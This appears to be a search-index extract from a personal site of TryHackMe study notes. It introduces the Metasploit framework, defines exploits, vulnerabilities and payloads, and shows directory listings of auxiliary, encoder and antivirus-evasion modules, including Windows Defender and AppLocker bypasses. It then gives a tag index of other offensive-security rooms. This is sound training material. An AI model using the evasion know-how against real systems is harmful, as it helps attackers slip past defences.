system. Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole). Auxiliary \u00b6 Any supporting module, such as scanners, crawlers and fuzzers, can be found here. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 auxiliary/ auxiliary / \u251c\u2500\u2500 admin \u251c\u2500\u2500 analyze \u251c\u2500\u2500 bnat \u251c\u2500\u2500 client \u251c\u2500\u2500 cloud \u251c\u2500\u2500 crawler \u251c\u2500\u2500 docx \u251c\u2500\u2500 dos \u251c\u2500\u2500 example . py \u251c\u2500\u2500 example . rb \u251c\u2500\u2500 fileformat \u251c\u2500\u2500 fuzzers \u251c\u2500\u2500 gather \u251c\u2500\u2500 parser \u251c\u2500\u2500 pdf \u251c\u2500\u2500 scanner \u251c\u2500\u2500 server \u251c\u2500\u2500 sniffer \u251c\u2500\u2500 spoof \u251c\u2500\u2500 sqli \u251c\u2500\u2500 voip \u2514\u2500\u2500 vsploit 20 directories , 2 files Encoders \u00b6 Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 encoders/ encoders / \u251c\u2500\u2500 cmd \u251c\u2500\u2500 generic \u251c\u2500\u2500 mipsbe \u251c\u2500\u2500 mipsle \u251c\u2500\u2500 php \u251c\u2500\u2500 ppc \u251c\u2500\u2500 ruby \u251c\u2500\u2500 sparc \u251c\u2500\u2500 x64 \u2514\u2500\u2500 x86 10 directories , 0 files Evasion \u00b6 While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, \u201cevasion\u201d modules will try that, with more or less success. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 2 evasion/ evasion / \u2514\u2500\u2500 windows \u251c\u2500\u2500 applocker_evasion_install_util . rb \u251c\u2500\u2500 applocker_evasion_msbuild . rb \u251c\u2500\u2500 applocker_evasion_presentationhost . rb \u251c\u2500\u2500 applocker_evasion_regasm_regsvcs . rb \u251c\u2500\u2500 applocker_evasion_workflow_compiler . rb \u251c\u2500\u2500 process_herpaderping . rb \u251c\u2500\u2500 syscall_inject . rb \u251c\u2500\u2500 windows_defender_exe . rb \u2514\u2500\u2500 windows_defender_js_hta . rb 1 directory , 9 files","title":"TryHackMe - Metasploit"},{"location":"tryhackme/room/metasploit/#tryhackme-metasploit","text":"Metasploit is the most widely used exploitation framework. Learn how to use it and unlock its full potential. The Metasploit framework is a set of open-source tools used for network enumeration, identifying vulnerabilities, developing payloads and executing exploit code against remote target machines. Get hands-on with the various tool and features Metasploit provides, from exploit development to post-exploitation techniques, this module covers it all.","title":"TryHackMe - Metasploit"},{"location":"tryhackme/room/metasploit/#task-1-introduction-to-metasploit","text":"Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation. Metasploit has two main versions: Metasploit Pro : The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI). Metasploit Framework : The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions. The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development. The main components of the Metasploit Framework can be summarized as follows; msfconsole : The main command-line interface. Modules : supporting modules such as exploits, scanners, payloads, etc. Tools : Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module. This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably. You can deploy and use the AttackBox to complete tasks and answer the questions. Answer the questions below No answer needed Answer Explain No answer needed No answer needed","title":"Task 1: Introduction to Metasploit"},{"location":"tryhackme/room/metasploit/#task-2-main-components-of-metasploit","text":"While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the msfconsole command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload. Exploit : A piece of code that uses a vulnerability present on the target system. Vulnerability : A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. Payload : An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system. Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).","title":"Task 2: Main Components of Metasploit"},{"location":"tryhackme/room/metasploit/#auxiliary","text":"Any supporting module, such as scanners, crawlers and fuzzers, can be found here. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 auxiliary/ auxiliary / \u251c\u2500\u2500 admin \u251c\u2500\u2500 analyze \u251c\u2500\u2500 bnat \u251c\u2500\u2500 client \u251c\u2500\u2500 cloud \u251c\u2500\u2500 crawler \u251c\u2500\u2500 docx \u251c\u2500\u2500 dos \u251c\u2500\u2500 example . py \u251c\u2500\u2500 example . rb \u251c\u2500\u2500 fileformat \u251c\u2500\u2500 fuzzers \u251c\u2500\u2500 gather \u251c\u2500\u2500 parser \u251c\u2500\u2500 pdf \u251c\u2500\u2500 scanner \u251c\u2500\u2500 server \u251c\u2500\u2500 sniffer \u251c\u2500\u2500 spoof \u251c\u2500\u2500 sqli \u251c\u2500\u2500 voip \u2514\u2500\u2500 vsploit 20 directories , 2 files","title":"Auxiliary"},{"location":"tryhackme/room/metasploit/#encoders","text":"Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 1 encoders/ encoders / \u251c\u2500\u2500 cmd \u251c\u2500\u2500 generic \u251c\u2500\u2500 mipsbe \u251c\u2500\u2500 mipsle \u251c\u2500\u2500 php \u251c\u2500\u2500 ppc \u251c\u2500\u2500 ruby \u251c\u2500\u2500 sparc \u251c\u2500\u2500 x64 \u2514\u2500\u2500 x86 10 directories , 0 files","title":"Encoders"},{"location":"tryhackme/room/metasploit/#evasion","text":"While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, \u201cevasion\u201d modules will try that, with more or less success. Terminal root @ip - 10 - 10 - 135 - 188 :/ opt / metasploit-framework / embedded / framework / modules # tree -L 2 evasion/ evasion / \u2514\u2500\u2500 windows \u251c\u2500\u2500 applocker_evasion_install_util . rb \u251c\u2500\u2500 applocker_evasion_msbuild . rb \u251c\u2500\u2500 applocker_evasion_presentationhost . rb \u251c\u2500\u2500 applocker_evasion_regasm_regsvcs . rb \u251c\u2500\u2500 applocker_evasion_workflow_compiler . rb \u251c\u2500\u2500 process_herpaderping . rb \u251c\u2500\u2500 syscall_inject . rb \u251c\u2500\u2500 windows_defender_exe . rb \u2514\u2500\u2500 windows_defender_js_hta . rb 1 directory , 9 files","title":"Evasion"},{"location":"tags/tags/","text":"Categories \u00b6 Intro Metasploit \u00b6 TryHackMe - Metasploit Intro Powershell Empire \u00b6 TryHackMe - Empire Linux \u00b6 Linux Privilege Escalation Privilege Escalation \u00b6 Linux Privilege Escalation Windows Privilege Escalation THM-CTF \u00b6 Lian_Yu THM-Init Access \u00b6 Init Access Init Access THM-Intro C2 \u00b6 TryHackMe - Intro to C2 THM-Intro PowerShell \u00b6 TryHackMe - Hacking with Powershell - Walkthrough THM-Password Attacks \u00b6 Password Attacks THM-Pentest \u00b6 Basic Pentesting THM-Phishing \u00b6 Phishing THM-Privilege Escalation \u00b6 Privilege Escalation Basic Pentesting THM-Weaponization \u00b6 Weaponization Windows \u00b6 Windows Privilege Escalation","title":"Categories"},{"location":"tags/tags/#categories","text":"","title":"Categories"},{"location":"tags/tags/#intro-metasploit","text":"TryHackMe - Metasploit","title":"Intro Metasploit"},{"location":"tags/tags/#intro-powershell-empire","text":"TryHackMe - Empire","title":"Intro Powershell Empire"},{"location":"tags/tags/#linux","text":"Linux Privilege Escalation","title":"Linux"},{"location":"tags/tags/#privilege-escalation","text":"Linux Privilege Escalation Windows Privilege Escalation","title":"Privilege Escalation"},{"location":"tags/tags/#thm-ctf","text":"Lian_Yu","title":"THM-CTF"},{"location":"tags/tags/#thm-init-access","text":"Init Access Init Access","title":"THM-Init Access"},{"location":"tags/tags/#thm-intro-c2","text":"TryHackMe - Intro to C2","title":"THM-Intro C2"},{"location":"tags/tags/#thm-intro-powershell","text":"TryHackMe - Hacking with Powershell - Walkthrough","title":"THM-Intro PowerShell"},{"location":"tags/tags/#thm-password-attacks","text":"Password Attacks","title":"THM-Password Attacks"},{"location":"tags/tags/#thm-pentest","text":"Basic Pentesting","title":"THM-Pentest"},{"location":"tags/tags/#thm-phishing","text":"Phishing","title":"THM-Phishing"},{"location":"tags/tags/#thm-privilege-escalation","text":"Privilege Escalation Basic Pentesting","title":"THM-Privilege Escalation"},{"location":"tags/tags/#thm-weaponization","text":"Weaponization","title":"THM-Weaponization"},{"location":"tags/tags/#windows","text":"Windows Privilege Escalation","title":"Windows"}]}